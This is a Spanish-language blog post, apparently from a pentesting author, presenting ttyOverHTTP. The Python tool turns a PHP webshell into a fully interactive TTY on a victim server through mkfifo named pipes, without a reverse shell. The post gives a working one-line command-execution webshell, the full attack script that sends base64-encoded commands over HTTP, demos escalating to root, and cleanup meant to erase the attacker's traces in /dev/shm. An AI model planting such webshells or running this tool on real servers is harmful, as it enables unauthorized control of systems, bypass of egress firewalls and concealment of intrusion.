---
layout: single
title: ttyOverHTTP - Herramienta
excerpt: "Utilidad en Python para obtener una TTY totalmente interactiva mediante explotación web sin necesidad de entablarse una Reverse Shell."
date: 2020-02-04
classes: wide
header:
  teaser: /assets/images/ttyOverHTTP/ttyoverhttp-banner.jpg
  teaser_home_page: true
categories:
  - Scripting
  - Utilidades
tags:
  - Python
  - Web Exploiting
  - Herramientas
---

![](/assets/images/ttyOverHTTP/linux-banner.png)

Podéis encontrar esta herramienta en el siguiente enlace:

* [https://github.com/s4vitar/ttyoverhttp](https://github.com/s4vitar/ttyoverhttp)

## ¿Qué es ttyOverHTTP?

**ttyOverHTTP** no es más que una herramienta de utilidad la cual nos permitirá en base a una webshell, sin la necesidad de entablarnos una reverse shell, contar con una TTY completamente interactiva, haciendo uso para ello de la utilidad `mkfifo`.

Para los que no entiendan la problemática de las webshells, podéis probarlo por vuestra cuenta... simplemente montad un servidor apache y alojad este recurso PHP en la ruta `/var/www/html/cmd.php`:

```php
<?php
    echo shell_exec($_REQUEST['cmd']);
?>
```

Como es de esperar, a través de la variable `cmd` está más que claro que vamos a ser capaces de ejecutar comandos a nivel de sistema como el usuario `www-data`:

<p align="center">
<img src="/assets/images/ttyOverHTTP/first-webserver.png">
</p>

Sin embargo, fijaros qué es lo que pasa si tratamos por ejemplo de efectuar una migración de usuario:

<p align="center">
<img src="/assets/images/ttyOverHTTP/second-webserver.png">
</p>

No podemos introducir la contraseña del usuario `root`, cosa que podríamos hacer si hiciéramos un tratamiento de la TTY desde consola, ya sabéis... el `stty raw -echo` y toda la movida.

De la misma forma, tampoco podemos correr desde una webshell el servicio `mysql` o `php` en modo interactivo, ni hacer un `sudo su` para introducir la contraseña. Tampoco podemos hacer desplazamientos entre directorios, me refiero... si hacemos `pwd` veremos la ruta actual en la que nos situamos, pero si luego enviamos un `cd /home` y volvemos en la siguiente consulta a hacer un `pwd` veremos que seguiremos en el mismo directorio inicial, no habiéndose efectuado el desplazamiento.

Todo esto sucede porque básicamente no estamos en una TTY, podemos comprobarlo de la siguiente forma:

<p align="center">
<img src="/assets/images/ttyOverHTTP/third-webserver.png">
</p>

Entonces bien, ¿qué hacemos en estos casos?, porque si nos entabláramos una Reverse Shell obviamente ya todo estaría hecho, ¿pero y si por iptables hay ciertas reglas configuradas tanto por ipv4 como por ipv6 que impiden conexiones salientes para entablarnos nuestra conexión?. 

Efectivamente, se nos complica un poco la labor.

## Movimiento lateral

En Linux, hay una utilidad que nos permite crear archivos **FIFO**. Un fichero FIFO es similar a una interconexión o tubería, excepto en que se crea de una forma distinta. En vez de ser un canal de comunicaciones anónimo, un fichero especial FIFO se mete en el sistema de ficheros mediante una llamada a **mkfifo**.

Veamos un ejemplo práctico de su uso. Por un lado desde terminal, haremos lo siguiente:

```go
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $mkfifo input; tail -f input | /bin/sh 2>&1 > output
```

Esto se quedará en escucha, por lo que posteriormente deberemos abrir una nueva consola aparte para hacer las pruebas. Ahora haremos lo siguiente:

```go
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $ls
input  output
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo "whoami" > input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $cat output 
s4vitar
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo "pwd" > input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo "cd .." > input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo "pwd" > input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $cat output 
s4vitar
/home/s4vitar/Desktop/example
/home/s4vitar/Desktop
```

Si os fijáis, para cada comando proporcionado en `input`, se nos lista el resultado del comando aplicado a nivel de sistema en el fichero `output`.

Ojo cuidado, esto sigue sin ser una TTY, sin embargo... podemos hacer lo siguiente:

```go
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo "script /dev/null -c bash" > input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $cat output 
s4vitar
/home/s4vitar/Desktop/example
/home/s4vitar/Desktop
Script started, file is /dev/null
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $
```

Fijaros cómo ahora se nos abre una consola aparte de la nuestra al leer el ficherito `output`. Tal vez lo veis mejor así:

```go
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $cat output; echo
s4vitar
/home/s4vitar/Desktop/example
/home/s4vitar/Desktop
Script started, file is /dev/null
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $
```

Ahí está. La superior a la de abajo del todo es la gestionada desde los ficheros `input` y `output`. ¿Qué es lo mejor de todo?, lo siguiente:

```go
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo "tty" > input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $cat output; echo
s4vitar
/home/s4vitar/Desktop/example
/home/s4vitar/Desktop
Script started, file is /dev/null
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $tty
/dev/pts/4
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $
```

Ya estamos en una TTY, y a partir de aquí es sencillo aprovechar al máximo las utilidades de consola:

```go
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo "php --interactive" > input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo '$word = "Hola";' > input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo 'echo $word;' > input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo 'quit' > input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo 'whoami' > input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $cat output
s4vitar
/home/s4vitar/Desktop/example
/home/s4vitar/Desktop
Script started, file is /dev/null
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $tty
/dev/pts/4
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $php --interactive
Interactive mode enabled

php > $word = "Hola";
php > echo $word;
Hola
php > quit
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $whoami
s4vitar
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $
```

De igual manera, podemos efectuar migraciones de usuario o convertirnos en root proporcionando la contraseña:

```go
─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo "sudo su" > input
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $echo "************" > input # Aquí pondríais vuestra contraseña
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $cat output ; echo
s4vitar
/home/s4vitar/Desktop/example
/home/s4vitar/Desktop
Script started, file is /dev/null
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $tty
/dev/pts/4
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $php --interactive
Interactive mode enabled

php > $word = "Hola";
php > echo $word;
Hola
php > quit
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $whoami
s4vitar
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $sudo su
[sudo] password for s4vitar: 
┌─[root@parrot]─[~/Desktop]
└──╼ #
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $
```

El único problema es que el fichero `output` va almacenando el resultado de los comandos anteriormente ejecutados desde consola introducidos en `input`, por lo que por cada vez que abramos el `output`, veremos este histórico.

Aún así, está todo pensado... no os preocupéis. ¿Cuál es la idea ahora?, pues aprovechar este principio para construir una utilidad en Python la cual nos permita comunicarnos, mediante la webshell previamente creada, con estos ficheritos `input` y `output` depositados sobre el sistema víctima explotando para ello la utilidad `mkfifo`.

Haríamos uso de la siguiente utilidad en Python3:

```python
#!/usr/bin/python3

import requests, time, threading, pdb, signal, sys
from base64 import b64encode
from random import randrange

class AllTheReads(object):
	def __init__(self, interval=1):
		self.interval = interval
		thread = threading.Thread(target=self.run, args=())
		thread.daemon = True
		thread.start()

	def run(self):
		readoutput = """/bin/cat %s""" % (stdout)
		clearoutput = """echo '' > %s""" % (stdout)
		while True:
			output = RunCmd(readoutput)
			if output:
				RunCmd(clearoutput)
				print(output)
			time.sleep(self.interval)

def RunCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	payload = {
        	'cmd' : 'echo "%s" | base64 -d | sh' %(cmd)
		}
	result = (requests.get('http://127.0.0.1/cmd.php', params=payload, timeout=5).text).strip()
	return result

def WriteCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	payload = {
		'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
	}
	result = (requests.get('http://127.0.0.1/cmd.php', params=payload, timeout=5).text).strip()
	return result

def ReadCmd():
        GetOutput = """/bin/cat %s""" % (stdout)
        output = RunCmd(GetOutput)
        return output

def SetupShell():
	NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)
	try:
		RunCmd(NamedPipes)
	except:
		None
	return None

global stdin, stdout
session = randrange(1000, 9999)
stdin = "/dev/shm/input.%s" % (session)
stdout = "/dev/shm/output.%s" % (session)
erasestdin = """/bin/rm %s""" % (stdin)
erasestdout = """/bin/rm %s""" % (stdout)

SetupShell()

ReadingTheThings = AllTheReads()

def sig_handler(sig, frame):
	print("\n\n[*] Exiting...\n")
	print("[*] Removing files...\n")
	RunCmd(erasestdin)
	RunCmd(erasestdout)
	print("[*] All files have been deleted\n")
	sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)

while True:
	cmd = input("> ")
	WriteCmd(cmd + "\n")
	time.sleep(1.1)
```

* **Importante**: En este caso estamos tirando contra la `127.0.0.1` suponiendo que el fichero se llama `cmd.php`, en vuestro caso lo tendréis que cambiar a lo que os toque.

Entonces bien, imaginad que ya tenéis un archivo `cmd.php` alojado en el servidor víctima, pues mirad que sencillo:

```go
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $python3 ttyOverHTTP.py 
> whoami
www-data
> pwd
/var/www/html
> cd /home
> pwd
/home
> ls -l
total 0
drwxr-xr-x 1 s4vitar s4vitar 1156 Feb  4 12:19 s4vitar
```

Ya directamente se gestiona desde el script la sesión, pudiendo así ver los outputs de los comandos que especifiquemos desde `input`. 

El procedimiento ahora para obtener una TTY y proseguir naturalmente sería el mismo que os mostré anteriormente:

```go
┌─[s4vitar@parrot]─[~/Desktop/example]
└──╼ $python3 ttyOverHTTP.py 
> whoami                  
www-data
> script /dev/null -c bash
Script started, file is /dev/null
www-data@parrot:/var/www/html$
> su s4vitar
su s4vitar
Password:
> ************* # Aquí va vuestra contraseña

░▒▓    /var/w/html  ✔ ▓▒░                                                  
> bash
bash
┌──[s4vitar@parrot]─[/var/www/html]
└──╼ $
> whoami
whoami
s4vitar
┌──[s4vitar@parrot]─[/var/www/html]
└──╼ $
> sudo su
sudo su
[sudo] password for s4vitar:
> *********** # Aquí va vuestra contraseña

░▒▓    /var/w/html  ✔   ▓▒░                                                
bash
bash
┌──[root@parrot]─[/var/www/html]
└──╼ #
> whoami
whoami
root
┌──[root@parrot]─[/var/www/html]
└──╼ #
> 
```

Como podréis comprobar, tenemos una TTY completamente interactiva, pudiendo hacer todo lo que haríamos desde consola pero gestionado todo a través de una webshell. Y cómo no... no nos hemos entablado una Reverse Shell, buena esa.

Si presionáis la tecla `Ctrl+C`, se eliminarán todos los ficheros temporales del sistema víctima creados para gestionar la sesión, limpiando así el rastro que como atacantes estamos dejando bajo la ruta `/dev/shm/`.





